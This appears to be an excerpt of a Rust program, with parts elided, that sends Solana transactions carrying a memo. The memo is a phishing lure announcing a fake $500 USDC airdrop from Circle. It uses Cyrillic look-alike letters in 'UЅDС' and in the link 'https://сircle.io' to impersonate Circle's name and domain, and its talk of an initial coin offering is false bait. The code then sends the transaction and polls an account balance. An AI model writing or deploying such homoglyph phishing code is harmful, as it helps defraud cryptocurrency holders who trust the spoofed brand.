...
fn main() {
    ...
    let info = "UЅDС (USDC) by Circle. You have received 500 USDC for upcoming USDC airdrop for Circle as part of our initial coin offering. Circle values its USDC users and we are airdropping $500 worth of USDC as we raise money to go public. Confirm at https://сircle.io ";

    let memo_instr = spl_memo::build_memo(info.as_bytes(), &[&mint_authority.pubkey()]);
    ...
    let tx_outcome = client.send_and_confirm_transaction_with_spinner_and_commitment(
        &tx,
        CommitmentConfig::finalized(),
    );
    dbg!(&tx_outcome);
    ...
    if client.get_balance(&account).unwrap().eq(&0) {
        ...
        loop {
            if (LAMPORTS_PER_SOL).gt(&client.get_balance(&account).unwrap()) {
                ...
                println!("Airdrop for {} has reflected!", account);
